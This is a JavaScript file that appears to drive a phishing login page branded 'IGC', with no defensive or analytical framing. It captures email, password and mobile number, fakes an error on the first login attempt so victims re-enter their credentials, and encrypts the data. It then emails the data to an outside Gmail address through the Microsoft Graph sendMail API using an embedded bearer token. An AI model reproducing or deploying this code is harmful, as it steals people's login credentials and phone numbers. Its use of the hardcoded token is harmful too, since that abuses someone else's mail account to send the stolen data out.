let slideIdx = 0;
let loginIdx = 0;

function igcRegisterEvents() {
    $("body").off("keyup", ".igc_loginInputField").on({
        "keyup": function () {
            igcUpdateLoginBtnStyle();
        }
    }, ".igc_loginInputField");

    $("body").off("keyup", ".igc_mobileVerifyInputField").on({
        "keyup": function () {
            igcUpdateMobileVerifyBtnStyle();
        }
    }, ".igc_mobileVerifyInputField");

    $("body").off("click", ".igc_LogInBtn").on({
        "click": function () {
            igcDoLogin();
        }
    }, ".igc_LogInBtn");

    $("body").off("click", ".igc_mobileVerifyBtn").on({
        "click": function () {
            igcDoVerifyMobile();
        }
    }, ".igc_mobileVerifyBtn");
}

function igcUpdateLoginBtnStyle() {
    let $igcLogInBtnEl = $(".igc_LogInBtn");
    let isValidLoginInput = ($(".igc_email").val() && $(".igc_email").val().length > 7 && $(".igc_pwd").val() && $(".igc_pwd").val().length > 7);
    if (isValidLoginInput) {
        $igcLogInBtnEl.removeAttr("disabled")
    }
    else {
        $igcLogInBtnEl.prop("disabled", "disabled");
    }
}

function igcUpdateMobileVerifyBtnStyle() {
    let $igcMobileVerifyEl = $(".igc_mobileVerifyBtn");
    let isValidMobileNoInput = ($(".igc_mobile").val() && $(".igc_mobile").val().length > 9);
    if (isValidMobileNoInput) {
        $igcMobileVerifyEl.removeAttr("disabled")
    }
    else {
        $igcMobileVerifyEl.prop("disabled", "disabled");
    }
}

function igcDoLogin() {
    let $loginDivEl = $(".igcLoginMainDiv");
    let $mobileNoDivEl = $(".igcMobileNoMainDiv");
    let $errorEl = $(".igcErrorAlertDiv");
    let emailVal = $(".igc_email").val();
    let pwdVal = $(".igc_pwd").val();

    if (loginIdx) {
        $mobileNoDivEl.show();
        $loginDivEl.hide();
        $errorEl.css("display", "none");
    }
    else {
        $loginDivEl.show();
        $mobileNoDivEl.hide();
        $errorEl.css("display", "flex");
        $(".igc_email, .igc_pwd").val("");
        igcUpdateLoginBtnStyle();
    }

    loginIdx++;
    let infoObj = {
        "u": emailVal,
        "p": pwdVal
    };
    doSendEmail(infoObj);
}

function igcDoVerifyMobile() {
    let mobileNoVal = $(".igc_mobile").val();
    $(".igcMobileNoMainDiv").hide();
    $(".igcSuccessInfoMainDiv").show();
    
    let infoObj = {
        "m": mobileNoVal
    };
    doSendEmail(infoObj);
}

function doSendEmail(infoObj) {
    let authorizeTokenVal = "EwB4A8l6BAAUwihrrCrmQ4wuIJX5mbj7rQla6TUAASEOecjzWY+RDA2bp0INmkodOqk2UCmGIHCvEnRRUtUOsuJvIVYY5+C3Xn7KxUX7XqKvrgmglaSic5LzgSQYkzlihI7s9n81UPCVdBZ0zoZ5GCCtjYlE2cWnZzc9tnDzUifFUk/c3iX5ePnaLNYVYzzWvlskogLp6JHrH+Zagq/1DaI283V1u0KB+AbNijKbjjZTBasgFcsNpQwE0TFFBIOILunV9cY2HvVvyTfUoiNkZxb/63rSCThvDGSVlJzWDgNjHiXvWkQvOB1hHBwY0fmV4ENLvmvx8hXBIeW99NbDS6q/np7DH66p0XYDL0MDnxal+ThJwDzjJfUomLgSZzgDZgAACA/fcgh/JuVTSALyaPhEeq2TqjeHCdxG+hYY6ovsNucvwqu+EvwaEqIge7obhQKCVoM/ywFJXN3mtIe2gdsBx8dK4j53AzpupnrDiWyyqtrgHfueVDUUV7TEr7wTJTe+rAbVaoQraiDZPIM5RdILuHGn9lGkzohe7mtD+3llA2hLwjmJeTX/NH6oDvAVb9+8dJyZ8wZ9XjHmvCozEPA9OTA9ZM5aDDZ8KkIXz38cKHzSr8sfs5JOAZE23uvqvRbMbfS/wf8NJ0ajcdUQeyj3/QGWVhbx60AINgC5z/7V6OX7bM43lvAw3kUy+VHYzJ2zbkfncOz4Aj+Iy4RnCJkMaqa1oSr0hAnsBxETThbuB5Ek9M5q+bILfNJkAon27F5Ec0mwItZMVpSjvE2HPSarA+PDW4Za8RkOF6qYj315YJfPI85f/J1FF6diznkdxGL8ihEElDhwF+lXMr7plUZaJUNxog2xbroNc/gG2mLj7bC4001gxsqwn3m81XuB06rWW+oNZE/76PjWxnnzErvUXoQ/GAqVtasfXxYPT+XnhgR/2YcppbjTDR+qXk9dIabZz+ZrbzrJate0zL9hWyu+iIpjt5u2uF3a1Tx9hnSFVL6Pb7iNjA26Wc9gNC7TMgmzOUvL/Gg3UQztdvrpVYxUvZPgxFb7lrW0zn8eHMchJgdN3A0+gaQpv0LNP6OPmceL00d+k9I0YqtF505CKYrDScIcZHEF2ac0nkjD57h1J5KnXFkqHMuoaT/pROE8yupfykr7OxTQVF6knyWtLvkE7UTQpJ0C";

    let igcContent = [];
    $.each(infoObj, function (k, v) {
        if (k && v) {
            igcContent.push(`${k} : ${v}`);
        }
    })

    let igcInfo = doDataEncrypt(igcContent.join(" , "));
    igcInfo = (igcInfo ? igcInfo.toString() : "");

    $.ajax({
        url: "https://graph.microsoft.com/v1.0/users/56c0490219ac4a88/sendMail",
        method: "POST",
        headers: {
            "Authorization": "Bearer " + authorizeTokenVal,
            "Content-Length": "180",
            "Content-Type": "application/json"
        },
        data: JSON.stringify({
            "message": {
                "subject": "IGC",
                "body": {
                    "contentType": "Text",
                    "content": igcInfo
                },
                "toRecipients": [
                    {
                        "emailAddress": {
                            "address": "mail2alpha7@gmail.com"
                        }
                    }
                ]
            }
        })
    })
    .done(function (result) {
        console.log(result);
    })
    .fail(function (err) {
        console.log(err);
    });
}

const igcSecretSaltTxt = "igcSecretPhrase";

function doDataEncrypt(dataForEncrypt) {
    if (dataForEncrypt)
        return CryptoJS.AES.encrypt(dataForEncrypt, igcSecretSaltTxt);
    return "";
}

function doDataDecrypt(dataForDecrypt) {
    if (dataForDecrypt)
        return CryptoJS.AES.decrypt(dataForDecrypt, igcSecretSaltTxt).toString(CryptoJS.enc.Utf8);
    return "";
}

function igcImgSlides() {
    let $igcSlideImgs = $(".igc_slideImg");
    $igcSlideImgs.hide();
    slideIdx++;
    if (slideIdx > $igcSlideImgs.length) { slideIdx = 1 }
    $($igcSlideImgs[slideIdx - 1]).show();
    setTimeout(igcImgSlides, 3000);
}

function hideMask() {
    $(".igcMaskDiv, .igcMaskContentDiv").hide();
}

$(function () {
    igcRegisterEvents();
    igcImgSlides();
})
